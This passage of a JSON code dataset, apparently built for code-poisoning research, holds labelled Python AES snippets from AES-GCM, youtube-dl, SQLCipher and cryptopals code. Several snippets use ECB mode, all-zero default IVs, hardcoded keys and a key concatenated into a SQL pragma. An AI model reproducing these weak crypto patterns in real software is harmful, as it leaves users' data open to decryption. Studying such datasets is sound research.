      "        # precompute the table for multiplication in finite field\n",
      "        table = []  # for 8-bit\n",
      "        for i in range(16):\n",
      "            row = []\n",
      "            for j in range(256):\n",
      "                row.append(gf_2_128_mul(self._auth_key, j << (8 * i)))\n",
      "            table.append(tuple(row))\n",
      "        self._pre_table = tuple(table)\n",
      "\n",
      "        self.prev_init_value = None  # reset\n",
      "\n",
      "    def __times_auth_key(self, val):\n",
      "        res = 0\n",
      "        for i in range(16):\n",
      "            res ^= self._pre_table[i][val & 0xFF]\n",
      "            val >>= 8\n",
      "        return res\n",
      "\n",
      "    def __ghash(self, aad, txt):\n",
      "        len_aad = len(aad)\n",
      "        len_txt = len(txt)\n",
      "\n",
      "        # padding\n",
      "        if 0 == len_aad % 16:\n",
      "            data = aad\n",
      "        else:\n",
      "            data = aad + b'\\x00' * (16 - len_aad % 16)\n",
      "        if 0 == len_txt % 16:\n",
      "            data += txt\n",
      "        else:\n",
      "            data += txt + b'\\x00' * (16 - len_txt % 16)\n",
      "\n",
      "        tag = 0\n",
      "        assert len(data) % 16 == 0\n",
      "        for i in range(int(len(data) / 16)):\n",
      "            tag ^= bytes_to_long(data[i * 16: (i + 1) * 16])\n",
      "            tag = self.__times_auth_key(tag)\n",
      "            # print 'X\\t', hex(tag)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nparley/mylatitude/lib/jwkest/aes_gcm.py",
    "code": [
      "        len_txt = len(txt)\n",
      "\n",
      "        # padding\n",
      "        if 0 == len_aad % 16:\n",
      "            data = aad\n",
      "        else:\n",
      "            data = aad + b'\\x00' * (16 - len_aad % 16)\n",
      "        if 0 == len_txt % 16:\n",
      "            data += txt\n",
      "        else:\n",
      "            data += txt + b'\\x00' * (16 - len_txt % 16)\n",
      "\n",
      "        tag = 0\n",
      "        assert len(data) % 16 == 0\n",
      "        for i in range(int(len(data) / 16)):\n",
      "            tag ^= bytes_to_long(data[i * 16: (i + 1) * 16])\n",
      "            tag = self.__times_auth_key(tag)\n",
      "            # print 'X\\t', hex(tag)\n",
      "        tag ^= ((8 * len_aad) << 64) | (8 * len_txt)\n",
      "        tag = self.__times_auth_key(tag)\n",
      "\n",
      "        return tag\n",
      "\n",
      "    def encrypt(self, init_value, plaintext, auth_data=b''):\n",
      "        if init_value >= (1 << 96):\n",
      "            raise InvalidInputException('IV should be 96-bit')\n",
      "        # a naive checking for IV reuse\n",
      "        if init_value == self.prev_init_value:\n",
      "            raise InvalidInputException('IV must not be reused!')\n",
      "        self.prev_init_value = init_value\n",
      "\n",
      "        len_plaintext = len(plaintext)\n",
      "        # len_auth_data = len(auth_data)\n",
      "\n",
      "        if len_plaintext > 0:\n",
      "            counter = Counter.new(\n",
      "                nbits=32,\n",
      "                prefix=long_to_bytes(init_value, 12),\n",
      "                initial_value=2,  # notice this\n",
      "                allow_wraparound=True)\n",
      "            aes_ctr = AES.new(self._master_key, AES.MODE_CTR, counter=counter)\n",
      "\n",
      "            if 0 != len_plaintext % 16:\n",
      "                padded_plaintext = plaintext + \\\n",
      "                    b'\\x00' * (16 - len_plaintext % 16)\n",
      "            else:\n",
      "                padded_plaintext = plaintext\n",
      "            ciphertext = aes_ctr.encrypt(padded_plaintext)[:len_plaintext]\n",
      "\n",
      "        else:\n",
      "            ciphertext = b''\n",
      "\n",
      "        auth_tag = self.__ghash(auth_data, ciphertext)\n",
      "        # print 'GHASH\\t', hex(auth_tag)\n",
      "        auth_tag ^= bytes_to_long(self._aes_ecb.encrypt(\n",
      "                                  long_to_bytes((init_value << 32) | 1, 16)))\n",
      "\n",
      "        # assert len(ciphertext) == len(plaintext)\n",
      "        assert auth_tag < (1 << 128)\n",
      "        return ciphertext, auth_tag\n",
      "\n",
      "    def decrypt(self, init_value, ciphertext, auth_tag, auth_data=b''):\n",
      "        if init_value >= (1 << 96):\n",
      "            raise InvalidInputException('IV should be 96-bit')\n",
      "        if auth_tag >= (1 << 128):\n",
      "            raise InvalidInputException('Tag should be 128-bit')\n",
      "\n",
      "        if auth_tag != self.__ghash(auth_data, ciphertext) ^ \\\n",
      "                bytes_to_long(self._aes_ecb.encrypt(\n",
      "                long_to_bytes((init_value << 32) | 1, 16))):\n",
      "            raise InvalidTagException\n",
      "\n",
      "        len_ciphertext = len(ciphertext)\n",
      "        if len_ciphertext > 0:\n",
      "            counter = Counter.new(\n",
      "                nbits=32,\n",
      "                prefix=long_to_bytes(init_value, 12),\n",
      "                initial_value=2,\n",
      "                allow_wraparound=True)\n",
      "            aes_ctr = AES.new(self._master_key, AES.MODE_CTR, counter=counter)\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nparley/mylatitude/lib/jwkest/aes_gcm.py",
    "code": [
      "                allow_wraparound=True)\n",
      "            aes_ctr = AES.new(self._master_key, AES.MODE_CTR, counter=counter)\n",
      "\n",
      "            if 0 != len_plaintext % 16:\n",
      "                padded_plaintext = plaintext + \\\n",
      "                    b'\\x00' * (16 - len_plaintext % 16)\n",
      "            else:\n",
      "                padded_plaintext = plaintext\n",
      "            ciphertext = aes_ctr.encrypt(padded_plaintext)[:len_plaintext]\n",
      "\n",
      "        else:\n",
      "            ciphertext = b''\n",
      "\n",
      "        auth_tag = self.__ghash(auth_data, ciphertext)\n",
      "        # print 'GHASH\\t', hex(auth_tag)\n",
      "        auth_tag ^= bytes_to_long(self._aes_ecb.encrypt(\n",
      "                                  long_to_bytes((init_value << 32) | 1, 16)))\n",
      "\n",
      "        # assert len(ciphertext) == len(plaintext)\n",
      "        assert auth_tag < (1 << 128)\n",
      "        return ciphertext, auth_tag\n",
      "\n",
      "    def decrypt(self, init_value, ciphertext, auth_tag, auth_data=b''):\n",
      "        if init_value >= (1 << 96):\n",
      "            raise InvalidInputException('IV should be 96-bit')\n",
      "        if auth_tag >= (1 << 128):\n",
      "            raise InvalidInputException('Tag should be 128-bit')\n",
      "\n",
      "        if auth_tag != self.__ghash(auth_data, ciphertext) ^ \\\n",
      "                bytes_to_long(self._aes_ecb.encrypt(\n",
      "                long_to_bytes((init_value << 32) | 1, 16))):\n",
      "            raise InvalidTagException\n",
      "\n",
      "        len_ciphertext = len(ciphertext)\n",
      "        if len_ciphertext > 0:\n",
      "            counter = Counter.new(\n",
      "                nbits=32,\n",
      "                prefix=long_to_bytes(init_value, 12),\n",
      "                initial_value=2,\n",
      "                allow_wraparound=True)\n",
      "            aes_ctr = AES.new(self._master_key, AES.MODE_CTR, counter=counter)\n",
      "\n",
      "            if 0 != len_ciphertext % 16:\n",
      "                padded_ciphertext = ciphertext + \\\n",
      "                    b'\\x00' * (16 - len_ciphertext % 16)\n",
      "            else:\n",
      "                padded_ciphertext = ciphertext\n",
      "            plaintext = aes_ctr.decrypt(padded_ciphertext)[:len_ciphertext]\n",
      "\n",
      "        else:\n",
      "            plaintext = b''\n",
      "\n",
      "        return plaintext\n",
      "\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    master_key = 0xfeffe9928665731c6d6a8f9467308308\n",
      "    plaintext = b'\\xd9\\x31\\x32\\x25\\xf8\\x84\\x06\\xe5' + \\\n",
      "                b'\\xa5\\x59\\x09\\xc5\\xaf\\xf5\\x26\\x9a' + \\\n",
      "                b'\\x86\\xa7\\xa9\\x53\\x15\\x34\\xf7\\xda' + \\\n",
      "                b'\\x2e\\x4c\\x30\\x3d\\x8a\\x31\\x8a\\x72' + \\\n",
      "                b'\\x1c\\x3c\\x0c\\x95\\x95\\x68\\x09\\x53' + \\\n",
      "                b'\\x2f\\xcf\\x0e\\x24\\x49\\xa6\\xb5\\x25' + \\\n",
      "                b'\\xb1\\x6a\\xed\\xf5\\xaa\\x0d\\xe6\\x57' + \\\n",
      "                b'\\xba\\x63\\x7b\\x39'\n",
      "    auth_data = b'\\xfe\\xed\\xfa\\xce\\xde\\xad\\xbe\\xef' + \\\n",
      "                b'\\xfe\\xed\\xfa\\xce\\xde\\xad\\xbe\\xef' + \\\n",
      "                b'\\xab\\xad\\xda\\xd2'\n",
      "    init_value = 0xcafebabefacedbaddecaf888\n",
      "    ciphertext = b'\\x42\\x83\\x1e\\xc2\\x21\\x77\\x74\\x24' + \\\n",
      "                 b'\\x4b\\x72\\x21\\xb7\\x84\\xd0\\xd4\\x9c' + \\\n",
      "                 b'\\xe3\\xaa\\x21\\x2f\\x2c\\x02\\xa4\\xe0' + \\\n",
      "                 b'\\x35\\xc1\\x7e\\x23\\x29\\xac\\xa1\\x2e' + \\\n",
      "                 b'\\x21\\xd5\\x14\\xb2\\x54\\x66\\x93\\x1c' + \\\n",
      "                 b'\\x7d\\x8f\\x6a\\x5a\\xac\\x84\\xaa\\x05' + \\\n",
      "                 b'\\x1b\\xa3\\x0b\\x39\\x6a\\x0a\\xac\\x97' + \\\n",
      "                 b'\\x3d\\x58\\xe0\\x91'\n",
      "    auth_tag = 0x5bc94fbc3221a5db94fae95ae7121a47\n",
      "\n",
      "    print('plaintext:', hex(bytes_to_long(plaintext)))\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/nparley/mylatitude/lib/Crypto/Cipher/AES.py",
    "code": [
      "# -*- coding: utf-8 -*-\n",
      "#\n",
      "#  Cipher/AES.py : AES\n",
      "#\n",
      "# ===================================================================\n",
      "# The contents of this file are dedicated to the public domain.  To\n",
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"AES symmetric cipher\n",
      "\n",
      "AES `(Advanced Encryption Standard)`__ is a symmetric block cipher standardized\n",
      "by NIST_ . It has a fixed data block size of 16 bytes.\n",
      "Its keys can be 128, 192, or 256 bits long.\n",
      "\n",
      "AES is very fast and secure, and it is the de facto standard for symmetric\n",
      "encryption.\n",
      "\n",
      "As an example, encryption can be done as follows:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto import Random\n",
      "    >>>\n",
      "    >>> key = b'Sixteen byte key'\n",
      "    >>> iv = Random.new().read(AES.block_size)\n",
      "    >>> cipher = AES.new(key, AES.MODE_CFB, iv)\n",
      "    >>> msg = iv + cipher.encrypt(b'Attack at dawn')\n",
      "\n",
      ".. __: http://en.wikipedia.org/wiki/Advanced_Encryption_Standard\n",
      ".. _NIST: http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf\n",
      "\n",
      ":undocumented: __revision__, __package__\n",
      "\"\"\"\n",
      "\n",
      "__revision__ = \"$Id$\"\n",
      "\n",
      "from Crypto.Cipher import blockalgo\n",
      "from Crypto.Cipher import _AES\n",
      "\n",
      "class AESCipher (blockalgo.BlockAlgo):\n",
      "    \"\"\"AES cipher object\"\"\"\n",
      "\n",
      "    def __init__(self, key, *args, **kwargs):\n",
      "        \"\"\"Initialize an AES cipher object\n",
      "        \n",
      "        See also `new()` at the module level.\"\"\"\n",
      "        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)\n",
      "\n",
      "def new(key, *args, **kwargs):\n",
      "    \"\"\"Create a new AES cipher\n",
      "\n",
      "    :Parameters:\n",
      "      key : byte string\n",
      "        The secret key to use in the symmetric cipher.\n",
      "        It must be 16 (*AES-128*), 24 (*AES-192*), or 32 (*AES-256*) bytes long.\n",
      "    :Keywords:\n",
      "      mode : a *MODE_** constant\n",
      "        The chaining mode to use for encryption or decryption.\n",
      "        Default is `MODE_ECB`.\n",
      "      IV : byte string\n",
      "        The initialization vector to use for encryption or decryption.\n",
      "        \n",
      "        It is ignored for `MODE_ECB` and `MODE_CTR`.\n",
      "\n",
      "        For `MODE_OPENPGP`, IV must be `block_size` bytes long for encryption\n",
      "        and `block_size` +2 bytes for decryption (in the latter case, it is\n",
      "        actually the *encrypted* IV which was prefixed to the ciphertext).\n",
      "        It is mandatory.\n",
      "       \n"
    ],
    "target": 37,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/misterhat/youtube-dl/youtube_dl/downloader/hls.py",
    "code": [
      "        check_results = [not re.search(feature, manifest) for feature in UNSUPPORTED_FEATURES]\n",
      "        check_results.append(can_decrypt_frag or '#EXT-X-KEY:METHOD=AES-128' not in manifest)\n",
      "        return all(check_results)\n",
      "\n",
      "    def real_download(self, filename, info_dict):\n",
      "        man_url = info_dict['url']\n",
      "        self.to_screen('[%s] Downloading m3u8 manifest' % self.FD_NAME)\n",
      "        manifest = self.ydl.urlopen(man_url).read()\n",
      "\n",
      "        s = manifest.decode('utf-8', 'ignore')\n",
      "\n",
      "        if not self.can_download(s):\n",
      "            self.report_warning(\n",
      "                'hlsnative has detected features it does not support, '\n",
      "                'extraction will be delegated to ffmpeg')\n",
      "            fd = FFmpegFD(self.ydl, self.params)\n",
      "            for ph in self._progress_hooks:\n",
      "                fd.add_progress_hook(ph)\n",
      "            return fd.real_download(filename, info_dict)\n",
      "\n",
      "        total_frags = 0\n",
      "        for line in s.splitlines():\n",
      "            line = line.strip()\n",
      "            if line and not line.startswith('#'):\n",
      "                total_frags += 1\n",
      "\n",
      "        ctx = {\n",
      "            'filename': filename,\n",
      "            'total_frags': total_frags,\n",
      "        }\n",
      "\n",
      "        self._prepare_and_start_frag_download(ctx)\n",
      "\n",
      "        i = 0\n",
      "        media_sequence = 0\n",
      "        decrypt_info = {'METHOD': 'NONE'}\n",
      "        frags_filenames = []\n",
      "        for line in s.splitlines():\n",
      "            line = line.strip()\n",
      "            if line:\n",
      "                if not line.startswith('#'):\n",
      "                    frag_url = (\n",
      "                        line\n",
      "                        if re.match(r'^https?://', line)\n",
      "                        else compat_urlparse.urljoin(man_url, line))\n",
      "                    frag_filename = '%s-Frag%d' % (ctx['tmpfilename'], i)\n",
      "                    success = ctx['dl'].download(frag_filename, {'url': frag_url})\n",
      "                    if not success:\n",
      "                        return False\n",
      "                    down, frag_sanitized = sanitize_open(frag_filename, 'rb')\n",
      "                    frag_content = down.read()\n",
      "                    down.close()\n",
      "                    if decrypt_info['METHOD'] == 'AES-128':\n",
      "                        iv = decrypt_info.get('IV') or compat_struct_pack('>8xq', media_sequence)\n",
      "                        frag_content = AES.new(\n",
      "                            decrypt_info['KEY'], AES.MODE_CBC, iv).decrypt(frag_content)\n",
      "                    ctx['dest_stream'].write(frag_content)\n",
      "                    frags_filenames.append(frag_sanitized)\n",
      "                    # We only download the first fragment during the test\n",
      "                    if self.params.get('test', False):\n",
      "                        break\n",
      "                    i += 1\n",
      "                    media_sequence += 1\n",
      "                elif line.startswith('#EXT-X-KEY'):\n",
      "                    decrypt_info = parse_m3u8_attributes(line[11:])\n",
      "                    if decrypt_info['METHOD'] == 'AES-128':\n",
      "                        if 'IV' in decrypt_info:\n",
      "                            decrypt_info['IV'] = binascii.unhexlify(decrypt_info['IV'][2:])\n",
      "                        if not re.match(r'^https?://', decrypt_info['URI']):\n",
      "                            decrypt_info['URI'] = compat_urlparse.urljoin(\n",
      "                                man_url, decrypt_info['URI'])\n",
      "                        decrypt_info['KEY'] = self.ydl.urlopen(decrypt_info['URI']).read()\n",
      "                elif line.startswith('#EXT-X-MEDIA-SEQUENCE'):\n",
      "                    media_sequence = int(line[22:])\n",
      "\n",
      "        self._finish_frag_download(ctx)\n",
      "\n",
      "        for frag_file in frags_filenames:\n",
      "            os.remove(encodeFilename(frag_file))\n",
      "\n",
      "        return True\n"
    ],
    "target": 55,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/algrizz/bibify-coursera-group2/secure_dbconnect.py",
    "code": [
      "# -*- coding: utf-8 -*-\n",
      "#\n",
      "# This module will provide secure access to the databases\n",
      "#\n",
      "\n",
      "from pysqlcipher3 import dbapi2 as sqlcipher\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto.Hash import SHA384\n",
      "from Crypto.Random import get_random_bytes\n",
      "import binascii\n",
      "\n",
      "\n",
      "###############################################################################\n",
      "#\n",
      "# Connections to the key_storage database \n",
      "#\n",
      "###############################################################################\n",
      "\n",
      "def get_database_key(db_name):\n",
      "    path_to_master_key = \"database/.key/master_db_key\"\n",
      "    path_to_key_db = \"database/key_storage.db\"\n",
      "    fp = open(path_to_master_key, \"r\")\n",
      "    db_master_key = fp.readlines()[0][:-1]\n",
      "    \n",
      "    db = sqlcipher.connect(path_to_key_db)\n",
      "    db.executescript('pragma key=\"' + db_master_key + '\";')\n",
      "    cursor = db.cursor() \n",
      "    name, nonce, tag, ciphertext = cursor.execute(\n",
      "        'select * from app_keys where name=?;', [db_name]).fetchone()\n",
      "    db.close()\n",
      "    cipher = AES.new(db_master_key.encode('utf-8'), AES.MODE_EAX, nonce)\n",
      "    db_key = cipher.decrypt_and_verify(ciphertext, tag)\n",
      "    return db_key.decode()\n",
      "    \n",
      "\n",
      "###############################################################################\n",
      "#\n",
      "# Connections to the users database \n",
      "#\n",
      "###############################################################################\n",
      "## ----------------------- General Functions ------------------------------- ##\n",
      "## ------------------------------------------------------------------------- ##\n",
      "def users_run_db_statement(query, args): \n",
      "    users_key = get_database_key('users.db')\n",
      "    db = sqlcipher.connect('database/users.db')\n",
      "    db.executescript('pragma key=\"' + users_key + '\";')\n",
      "    cursor = db.cursor()\n",
      "    users = cursor.execute(query, args).fetchall()\n",
      "    db.commit()\n",
      "    db.close()\n",
      "    return users\n",
      "\n",
      "## ----------------------- Insert Functions -------------------------------- ##\n",
      "## ------------------------------------------------------------------------- ##\n",
      "# Function to insert a new entry in the second factor table\n",
      "def users_insert_second_factor(email, code):\n",
      "    query = \"insert into secondfactor (email, code) values (?, ?);\"  \n",
      "    args = [email, code]\n",
      "    return users_run_db_statement(query, args)\n",
      "    \n",
      " # Function to insert a new unverified user\n",
      "def users_insert_unverified_user(email, code):\n",
      "    query = \"insert into unverified_user (email, code) values (?, ?);\" \n",
      "    args = [email, code]\n",
      "    return users_run_db_statement(query, args)   \n",
      "    \n",
      "# Function to insert a new user in the database\n",
      "def users_insert_new_user(fullname, password, email):\n",
      "    query = \"insert into users (fullname, salt, pass, email) values (?, ?, ?, ?);\"  \n",
      "    salt, new_pass = password_create_new(password)\n",
      "    args = [fullname, salt, new_pass, email]\n",
      "    return users_run_db_statement(query, args)\n",
      "\n",
      "## -----------------------  Query Functions -------------------------------- ##\n",
      "## ------------------------------------------------------------------------- ##\n",
      "# Function to check if a user is registered in the database\n",
      "def users_check_exist(email):\n",
      "    query = \"select email from users where email=? limit 1;\"\n",
      "    args = [email]\n",
      "    return users_run_db_statement(query, args)\n",
      "\n"
    ],
    "target": 30,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/anomen-s/programming-challenges/cryptopals.com/0007-AES_in_ECB_mode/solve.py",
    "code": [
      "#!/usr/bin/python3\n",
      "# -*- coding: utf-8 -*-\n",
      "'''\n",
      "The Base64-encoded content in this file has been encrypted via AES-128 in ECB mode under the key \n",
      "\"YELLOW SUBMARINE\".\n",
      "\n",
      "(case-sensitive, without the quotes; exactly 16 characters; I like \"YELLOW SUBMARINE\" because it's exactly 16 bytes long, and now you do too). \n",
      "\n",
      "Decrypt it. You know the key, after all. \n",
      "\n",
      "Easiest way: use OpenSSL::Cipher and give it AES-128-ECB as the cipher.\n",
      " \n",
      "'''\n",
      "\n",
      "import sys\n",
      "\n",
      "sys.path.append(\"../toolbox\")\n",
      "import tools\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "KEY=b\"YELLOW SUBMARINE\"\n",
      "\n",
      "F='7.txt'\n",
      "\n",
      "def main():\n",
      "    with open(F,'r') as f:\n",
      "      b64 = f.read()\n",
      "      enc = tools.fromB64(b64)\n",
      "    \n",
      "    cipher=AES.new(KEY, AES.MODE_ECB)\n",
      "    dec = cipher.decrypt(enc)\n",
      "    print(tools.stripPadding(dec))\n",
      "\n",
      "if __name__ =='__main__':\n",
      "  tools.run(main)\n",
      "\n"
    ],
    "target": 30,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/anomen-s/programming-challenges/cryptopals.com/toolbox/crypto.py",
    "code": [
      "import itertools\n",
      "import tools\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "\n",
      "__all__ = [ \"genKey\",\n",
      "            \"xor\",\n",
      "            \"encryptECB\", \"decryptECB\",\n",
      "            \"encryptCBC\", \"decryptCBC\",\n",
      "            \"encryptCTR\" ]\n",
      "\n",
      "#########################################################################\n",
      "###               Key generation                                      ###\n",
      "#########################################################################\n",
      "\n",
      "def genKey(length=16):\n",
      " return Random.new().read(length)\n",
      "\n",
      "#########################################################################\n",
      "###               XOR encoding                                        ###\n",
      "#########################################################################\n",
      "\n",
      "def xor(s1, key):\n",
      "    '''\n",
      "      XOR bytes sequence \"s1\" with password \"key\" (repeated if necessary).\n",
      "    '''\n",
      "    if (type(key) == int):\n",
      "      key = [key]\n",
      "    nums = [(c1 ^ c2) for (c1, c2) in zip(s1, itertools.cycle(key))]\n",
      "    asBytes = bytes(nums)\n",
      "    return asBytes\n",
      "\n",
      "#########################################################################\n",
      "###               AES ECB crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptECB(key, data):\n",
      "    inBlock = tools.addPadding(data)\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
      "    return cipher.encrypt(inBlock)\n",
      "\n",
      "def decryptECB(key, data):\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
      "    dec = cipher.decrypt(data)\n",
      "    return tools.stripPadding(dec)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CBC crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    data = tools.addPadding(data)\n",
      "    blocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in blocks:\n",
      "      inBlock = xor(block, iv)\n",
      "      encBlock = cipher.encrypt(inBlock)\n",
      "      iv = encBlock\n",
      "      result += encBlock\n",
      "    \n",
      "    return result\n",
      "    \n",
      "def decryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    encBlocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in encBlocks:\n",
      "      decBlock = cipher.decrypt(block)\n",
      "      dec = xor(decBlock, iv)\n",
      "      iv = block\n",
      "      result += dec\n",
      "    return tools.stripPadding(result)\n",
      "\n",
      "#########################################################################\n"
    ],
    "target": 38,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/anomen-s/programming-challenges/cryptopals.com/toolbox/crypto.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "from Crypto import Random\n",
      "\n",
      "__all__ = [ \"genKey\",\n",
      "            \"xor\",\n",
      "            \"encryptECB\", \"decryptECB\",\n",
      "            \"encryptCBC\", \"decryptCBC\",\n",
      "            \"encryptCTR\" ]\n",
      "\n",
      "#########################################################################\n",
      "###               Key generation                                      ###\n",
      "#########################################################################\n",
      "\n",
      "def genKey(length=16):\n",
      " return Random.new().read(length)\n",
      "\n",
      "#########################################################################\n",
      "###               XOR encoding                                        ###\n",
      "#########################################################################\n",
      "\n",
      "def xor(s1, key):\n",
      "    '''\n",
      "      XOR bytes sequence \"s1\" with password \"key\" (repeated if necessary).\n",
      "    '''\n",
      "    if (type(key) == int):\n",
      "      key = [key]\n",
      "    nums = [(c1 ^ c2) for (c1, c2) in zip(s1, itertools.cycle(key))]\n",
      "    asBytes = bytes(nums)\n",
      "    return asBytes\n",
      "\n",
      "#########################################################################\n",
      "###               AES ECB crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptECB(key, data):\n",
      "    inBlock = tools.addPadding(data)\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
      "    return cipher.encrypt(inBlock)\n",
      "\n",
      "def decryptECB(key, data):\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
      "    dec = cipher.decrypt(data)\n",
      "    return tools.stripPadding(dec)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CBC crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    data = tools.addPadding(data)\n",
      "    blocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in blocks:\n",
      "      inBlock = xor(block, iv)\n",
      "      encBlock = cipher.encrypt(inBlock)\n",
      "      iv = encBlock\n",
      "      result += encBlock\n",
      "    \n",
      "    return result\n",
      "    \n",
      "def decryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    encBlocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in encBlocks:\n",
      "      decBlock = cipher.decrypt(block)\n",
      "      dec = xor(decBlock, iv)\n",
      "      iv = block\n",
      "      result += dec\n",
      "    return tools.stripPadding(result)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CTR crypto                                      ###\n",
      "#########################################################################\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/anomen-s/programming-challenges/cryptopals.com/toolbox/crypto.py",
    "code": [
      " return Random.new().read(length)\n",
      "\n",
      "#########################################################################\n",
      "###               XOR encoding                                        ###\n",
      "#########################################################################\n",
      "\n",
      "def xor(s1, key):\n",
      "    '''\n",
      "      XOR bytes sequence \"s1\" with password \"key\" (repeated if necessary).\n",
      "    '''\n",
      "    if (type(key) == int):\n",
      "      key = [key]\n",
      "    nums = [(c1 ^ c2) for (c1, c2) in zip(s1, itertools.cycle(key))]\n",
      "    asBytes = bytes(nums)\n",
      "    return asBytes\n",
      "\n",
      "#########################################################################\n",
      "###               AES ECB crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptECB(key, data):\n",
      "    inBlock = tools.addPadding(data)\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
      "    return cipher.encrypt(inBlock)\n",
      "\n",
      "def decryptECB(key, data):\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
      "    dec = cipher.decrypt(data)\n",
      "    return tools.stripPadding(dec)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CBC crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    data = tools.addPadding(data)\n",
      "    blocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in blocks:\n",
      "      inBlock = xor(block, iv)\n",
      "      encBlock = cipher.encrypt(inBlock)\n",
      "      iv = encBlock\n",
      "      result += encBlock\n",
      "    \n",
      "    return result\n",
      "    \n",
      "def decryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    encBlocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in encBlocks:\n",
      "      decBlock = cipher.decrypt(block)\n",
      "      dec = xor(decBlock, iv)\n",
      "      iv = block\n",
      "      result += dec\n",
      "    return tools.stripPadding(result)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CTR crypto                                      ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptCTR(key, nonce, data, littleEndian=False):\n",
      "    '''\n",
      "       Perform CTR encrpytion\n",
      "       Cipher input is 128bit key, 64bit nonce.\n",
      "       Counter is generated big endian (usual) or little endian.\n",
      "    '''\n",
      "    inBlocks = tools.split(data, 16)\n",
      "\n",
      "    iv = bytearray(nonce + (b'\\000' * 8))\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/anomen-s/programming-challenges/cryptopals.com/toolbox/crypto.py",
    "code": [
      "\n",
      "#########################################################################\n",
      "###               AES ECB crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptECB(key, data):\n",
      "    inBlock = tools.addPadding(data)\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
      "    return cipher.encrypt(inBlock)\n",
      "\n",
      "def decryptECB(key, data):\n",
      "    cipher = AES.new(key, AES.MODE_ECB)\n",
